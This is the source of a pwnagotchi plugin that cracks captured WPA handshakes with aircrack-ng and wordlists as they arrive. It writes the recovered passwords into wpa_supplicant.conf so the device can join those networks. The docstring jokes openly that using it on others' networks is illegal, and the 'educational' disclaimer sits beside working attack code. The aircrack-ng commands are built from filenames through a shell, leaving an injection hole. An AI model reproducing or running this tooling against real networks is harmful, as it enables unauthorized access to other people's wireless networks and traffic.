__author__ = 'forrest'
__version__ = '1.0.0'
__name__ = 'quick_rides_to_jail'
__license__ = 'GPL3'
__description__ = 'Run a quick dictionary scan against captured handshakes, update wpa_supplicant for the supplied interface, and go straight to jail.'

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked 

Also, disable the quickdic plugin because I don't know what will happen if you use both...
It is assumed that you are using another wireless adapter to do everything because you
need a free, non-monitor mode adapter to fully violate your country's laws.

My setup:
    I'm using a Raspberry Pi 3B+/4 with default raspbian. I have a dank wireless adapter
    plugged into one USB port. A second USB port is occupied by a BU-353S4 GPS dongle.
    The Pi's GPIO interface is occupied by the Waveshare GSM/SPRS/GNSS Bluetooth HAT for
    SIM868 cards. I don't get to see my beautiful boy's face too often :(

Original use-case: 
    Emergency communications out to the internet, via distributed out-of-band network of
    pwnagotchi's. My research is in support of developing a PoC prototype mesh network capable
    of using the pwnagotchi's network to courier data over its out-of-band wireless channel
    and bridge gaps with pwnd wireless networks. Meh. One pwnagotchi encounters another in the
    desert, briefly. The one stranded in the desert holds out an encrypted message for family.
    A dieing wish. The traveling pwnagotchi picks up the message, says "I got you bro", and
    takes the message out to civilization, to pass on. The traveling pwnagotchi searches high
    and low for the desert bro's fam, but can't find them. Just then, the traveler connects
    to a wayward watering hole (i.e. a pwnd access point), and can send out a message, on blast 
    to desert bro's fam. Could low-key be a legit means of connectivity in a post-appocalypse
    type situation, but is high-key probably illegal for you to do on anyone else's network.
    Have fun in jail.

For educational and testing purposes, only. If you do not think that you have violated the law,
you most certainly are about to. By using and enabling the full functionality of this script,
you here by agree to sit quietly in the back of the police car.
'''

import logging
import os
import subprocess
import string
import re
from collections import namedtuple

OPTIONS = dict()

# I clearly don't understand how this works OR it should work better:
#desired_interface = OPTIONS['interface']
#HANDSHAKES_PATH = OPTIONS['handshakes_path']
#NET_DEVICE_PATH = OPTIONS['net_device_path']
#WPA_SUPPLICANT_CONF_PATH = OPTIONS['wpa_supplicant_conf_path']

desired_interface = 'wlan0'
HANDSHAKES_PATH = '/root/handshakes/'
NET_DEVICE_PATH = '/sys/class/net'
WPA_SUPPLICANT_CONF_PATH = '/etc/wpa_supplicant/wpa_supplicant.conf'

PwndNetwork = namedtuple('PwndNetwork', 'ssid bssid password')
handshake_file_re = re.compile('^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$')

def reconfigure_wpa_supplicant():
    command = "wpa_cli -i {} reconfigure".format(desired_interface)
    result = subprocess.check_output(command, shell=True)
    if result.strip() == 'OK':
        logging.info('[thePolice] Successfully updated wpa_supplicant for {}.'.format(desired_interface))
    else:
        logging.info('[thePolice] Failed to update wpa_supplicant for {}.'.format(desired_interface))

def get_pwnd_networks():
    pwnd_networks = []
    file_matches = [handshake_file_re.search(file_name) for file_name in os.listdir(HANDSHAKES_PATH) if handshake_file_re.search(file_name) != None]
    for file_match in file_matches:
        try:
            with open(os.path.join(HANDSHAKES_PATH, file_match.string),'r') as f:
                #print('{} {} {}'.format(file_match.group('ssid'), re.sub(r'(.{2})(?!$)', r'\1:', file_match.group('bssid')), f.read()))
                pwnd_networks.append(PwndNetwork(file_match.group('ssid'), re.sub(r'(.{2})(?!$)', r'\1:', file_match.group('bssid')), f.read()))
        except:
            continue
    return pwnd_networks

def add_pwnd_networks_to_wpa_supplicant():
    wpa_supplicant_text = ''
    updated_count = 0
    try:
        with open(WPA_SUPPLICANT_CONF_PATH, 'r') as f:
            wpa_supplicant_text = f.read()
    except:
        return
    for pwnd_network in get_pwnd_networks():
        new_wpa_supplicant_string = ("network={{\n\tbssid={}\n\tpsk=\"{}\"\n\tkey_mgmt=WPA-PSK\n\tdisabled=1\n}}\n".format(pwnd_network.bssid, pwnd_network.password))
        if new_wpa_supplicant_string not in wpa_supplicant_text:
            try:
                with open(WPA_SUPPLICANT_CONF_PATH, 'a') as f:
                    #print(new_wpa_supplicant_string)
                    f.write(new_wpa_supplicant_string+'\n')
                    updated_count += 1
            except:
                continue
    if updated_count > 0:
        logging.info('[thePolice] Congratulations! You added {} new access points to your wpa_supplicant.conf.'.format(updated_count))
        logging.info('[thePolice] You\'re going to jail!')
        reconfigure_wpa_supplicant()

def get_network_interfaces():
    return os.listdir(NET_DEVICE_PATH)

def device_in_monitor_mode(device_name):
    device_type = ''
    try:
        with open(os.path.join(NET_DEVICE_PATH, device_name, 'type')) as f:
            device_type = f.read().strip()
    except:
        device_type = ''
    if device_type == '803':
        return True
    else:
        return False

def do_the_illegal_thing():
    if desired_interface not in get_network_interfaces():
        logging.info('[thePolice] Could not find desired interface in list of local interfaces.')
    else:
        logging.info('[thePolice] Found desired interface in list of local interfaces.')
        if device_in_monitor_mode(desired_interface):
            logging.info('[thePolice] Desired interface is in monitor mode - cannot use.')
        else:
            logging.info('[thePolice] Desired interface is not in monitor mode.')
            add_pwnd_networks_to_wpa_supplicant()

def on_loaded():
    logging.info("Quick rides to prison and dictionary check plugin loaded")

def on_handshake(agent, filename, access_point, client_station):
    display = agent._view
    result = subprocess.run(('/usr/bin/aircrack-ng '+ filename +' | grep "1 handshake" | awk \'{print $2}\''),shell=True, stdout=subprocess.PIPE)
    result = result.stdout.decode('utf-8').translate({ord(c) :None for c in string.whitespace})
    if not result:
        logging.info("[thePolice] No handshake")
    else:
        logging.info("[thePolice] Handshake confirmed")
        result2 = subprocess.run(('aircrack-ng -w `echo '+OPTIONS['wordlist_folder']+'*.txt | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q -b '+result+' '+filename+' | grep KEY'),shell=True,stdout=subprocess.PIPE)
        result2 = result2.stdout.decode('utf-8').strip()
        logging.info("[thePolice] "+result2)
        if result2 != "KEY NOT FOUND":
            key = re.search('\[(.*)\]', result2)
            pwd = str(key.group(1))
            do_the_illegal_thing()
            set_text("Cracked password: "+pwd)
            display.update(force=True)

text_to_set = "";
def set_text(text):
    global text_to_set
    text_to_set = text

def on_ui_update(ui):
    global text_to_set
    if text_to_set:
        ui.set('face', "(XωX)")
        ui.set('status', text_to_set)
        text_to_set = ""
